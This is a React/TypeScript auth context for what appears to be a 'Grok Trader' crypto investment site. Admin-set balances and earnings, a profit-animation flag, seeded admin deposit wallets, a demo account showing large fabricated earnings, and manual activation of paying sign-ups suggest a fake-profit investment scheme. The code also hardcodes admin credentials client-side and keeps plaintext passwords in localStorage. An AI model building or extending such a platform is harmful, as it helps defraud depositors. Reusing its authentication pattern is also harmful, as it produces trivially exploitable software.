import { createContext, useContext, useState, useEffect, ReactNode } from 'react';

interface User {
  id: string;
  username: string;
  email: string;
  role: 'admin' | 'user';
  password: string;
  balance: number;
  depositAmount: number;
  currentEarnings: number;
  totalDeposits: number;
  activeTrades: number;
  tradingPeriodEnd: string;
  recentDeposits: Array<{
    id: string;
    amount: number;
    date: string;
    status: string;
  }>;
  profitAnimationEnabled: boolean;
  status: 'pending' | 'active';
  grokVersion?: string;
  tier?: string;
  walletAddress?: string;
  createdAt: string;
}

interface AuthContextType {
  user: User | null;
  isAdmin: boolean;
  login: (username: string, password: string) => Promise<boolean>;
  logout: () => void;
  updateUser: (updates: Partial<User>) => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

// Admin credentials (hardcoded, not exposed in UI)
const ADMIN_USERNAME = 'GrokGodadmin';
const ADMIN_PASSWORD = 'grokadmin123@,';

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);

  useEffect(() => {
    // Initialize users on mount
    initializeUsers();

    // Check for existing session
    const storedUser = localStorage.getItem('currentUser');
    if (storedUser) {
      try {
        setUser(JSON.parse(storedUser));
      } catch (e) {
        localStorage.removeItem('currentUser');
      }
    }
  }, []);

  const login = async (username: string, password: string): Promise<boolean> => {
    const loggedInUser = loginFunction(username, password);
    
    if (loggedInUser) {
      setUser(loggedInUser);
      return true;
    }
    
    return false;
  };

  const logout = () => {
    setUser(null);
    localStorage.removeItem('currentUser');
  };

  const updateUser = (updates: Partial<User>) => {
    if (user) {
      const updatedUser = { ...user, ...updates };
      setUser(updatedUser);
      localStorage.setItem('currentUser', JSON.stringify(updatedUser));
      
      // Also update in users list if not admin
      if (user.role !== 'admin') {
        updateUserData(user.username, updates);
      }
    }
  };

  const isAdmin = user?.role === 'admin';

  return (
    <AuthContext.Provider value={{ user, isAdmin, login, logout, updateUser }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}

// User management functions for admin
export function getAllUsers(): User[] {
  const usersData = localStorage.getItem('users');
  if (usersData) {
    const users: User[] = JSON.parse(usersData);
    return users;
  }
  return [];
}

export function createUser(userData: Partial<User>): User {
  const users = getAllUsers();
  
  const newUser: User = {
    id: Date.now().toString(),
    username: userData.username || '',
    email: userData.email || `${userData.username}@grokai.com`,
    role: 'user',
    password: userData.password || '',
    balance: userData.balance || 0,
    depositAmount: userData.depositAmount || 0,
    currentEarnings: userData.currentEarnings || 0,
    totalDeposits: userData.totalDeposits || 0,
    activeTrades: userData.activeTrades || 0,
    tradingPeriodEnd: userData.tradingPeriodEnd || new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
    recentDeposits: userData.recentDeposits || [],
    profitAnimationEnabled: userData.profitAnimationEnabled ?? true,
    status: userData.status || 'active', // Default to active for admin-created users
    grokVersion: userData.grokVersion || '',
    tier: userData.tier || '',
    walletAddress: userData.walletAddress || '',
    createdAt: userData.createdAt || new Date().toISOString(),
  };

  users.push(newUser);
  localStorage.setItem('users', JSON.stringify(users));
  return newUser;
}

// Create a pending user (for signup flow)
export function createPendingUser(userData: {
  username: string;
  password: string;
  grokVersion: string;
  tier: string;
  tierAmount: string;
  walletAddress: string;
}): User {
  const users = getAllUsers();
  
  // Check if username already exists
  if (users.find(u => u.username === userData.username)) {
    throw new Error('Username already exists');
  }
  
  const newUser: User = {
    id: Date.now().toString(),
    username: userData.username,
    email: `${userData.username}@grokai.com`,
    role: 'user',
    password: userData.password,
    balance: 0,
    depositAmount: 0,
    currentEarnings: 0,
    totalDeposits: 0,
    activeTrades: 0,
    tradingPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
    recentDeposits: [],
    profitAnimationEnabled: true,
    status: 'pending', // Pending until admin activates
    grokVersion: userData.grokVersion,
    tier: userData.tier,
    walletAddress: userData.walletAddress,
    createdAt: new Date().toISOString(),
  };

  users.push(newUser);
  localStorage.setItem('users', JSON.stringify(users));
  return newUser;
}

// Activate a pending user
export function activateUser(username: string): void {
  const users = getAllUsers();
  const userIndex = users.findIndex(u => u.username === username);
  
  if (userIndex !== -1) {
    const user = users[userIndex];
    user.status = 'active';
    
    // If user has a deposit amount but no recent deposits, create one
    if (user.depositAmount > 0 && (!user.recentDeposits || user.recentDeposits.length === 0)) {
      user.recentDeposits = [{
        id: `dep_${Date.now()}`,
        amount: user.depositAmount,
        date: new Date().toISOString(),
        status: 'completed',
      }];
    }
    
    users[userIndex] = user;
    localStorage.setItem('users', JSON.stringify(users));
  }
}

export function updateUserData(username: string, updates: Partial<User>): void {
  const users = getAllUsers();
  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], ...updates };
    localStorage.setItem('users', JSON.stringify(users));
  }
}

export function deleteUser(username: string): void {
  const users = getAllUsers();
  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users.splice(userIndex, 1);
    localStorage.setItem('users', JSON.stringify(users));
  }
}

// Helper functions
function initializeUsers() {
  const usersData = localStorage.getItem('users');
  if (!usersData) {
    const defaultUsers = [
      {
        id: 'admin',
        username: ADMIN_USERNAME,
        email: 'admin@grokai.com',
        role: 'admin',
        password: ADMIN_PASSWORD,
        balance: 0,
        depositAmount: 0,
        currentEarnings: 0,
        totalDeposits: 0,
        activeTrades: 0,
        tradingPeriodEnd: new Date().toISOString(),
        recentDeposits: [],
        profitAnimationEnabled: false,
        status: 'active',
        createdAt: new Date().toISOString(),
      },
      {
        id: '2',
        username: 'demo_user',
        email: 'demo@grokai.com',
        role: 'user',
        password: 'demo123',
        balance: 250000,
        depositAmount: 100000,
        currentEarnings: 150000,
        totalDeposits: 100000,
        activeTrades: 12,
        tradingPeriodEnd: new Date(Date.now() + 15 * 24 * 60 * 60 * 1000).toISOString(),
        recentDeposits: [
          {
            id: '1',
            amount: 100000,
            date: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
            status: 'completed',
          },
        ],
        profitAnimationEnabled: true,
        status: 'active',
        grokVersion: 'Grok Trader 2.5',
        tier: 'Pro',
        createdAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
      },
    ];
    localStorage.setItem('users', JSON.stringify(defaultUsers));
  }
  
  // Initialize default wallet addresses if none exist
  const walletsData = localStorage.getItem('admin_wallets');
  if (!walletsData) {
    const defaultWallets = [
      {
        id: 'wallet_1',
        address: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1',
        addedAt: new Date().toISOString(),
      },
      {
        id: 'wallet_2',
        address: '0x9aE7A3e8c5b4D0a2F1C6E8d9B3A5F2C7E1D4B6A8',
        addedAt: new Date().toISOString(),
      },
      {
        id: 'wallet_3',
        address: '0x1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E',
        addedAt: new Date().toISOString(),
      },
      {
        id: 'wallet_4',
        address: '0x4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C',
        addedAt: new Date().toISOString(),
      },
      {
        id: 'wallet_5',
        address: '0x7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F',
        addedAt: new Date().toISOString(),
      },
      {
        id: 'wallet_6',
        address: '0xA1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0',
        addedAt: new Date().toISOString(),
      },
    ];
    localStorage.setItem('admin_wallets', JSON.stringify(defaultWallets));
  }
}

function loginFunction(username: string, password: string): User | null {
  // Check admin credentials first
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    const adminUser: User = {
      id: 'admin',
      username: ADMIN_USERNAME,
      email: 'admin@grokai.com',
      role: 'admin',
      password: ADMIN_PASSWORD,
      balance: 0,
      depositAmount: 0,
      currentEarnings: 0,
      totalDeposits: 0,
      activeTrades: 0,
      tradingPeriodEnd: new Date().toISOString(),
      recentDeposits: [],
      profitAnimationEnabled: false,
      status: 'active',
      createdAt: new Date().toISOString(),
    };
    localStorage.setItem('currentUser', JSON.stringify(adminUser));
    return adminUser;
  }

  // Check regular users from localStorage
  const usersData = localStorage.getItem('users');
  if (usersData) {
    const users: User[] = JSON.parse(usersData);
    const user = users.find(
      (u) => u.username === username && u.password === password && u.role === 'user'
    );

    if (user) {
      // Check if user is active
      if (user.status !== 'active') {
        return null; // Don't allow login for pending users
      }
      
      localStorage.setItem('currentUser', JSON.stringify(user));
      return user;
    }
  }

  return null;
}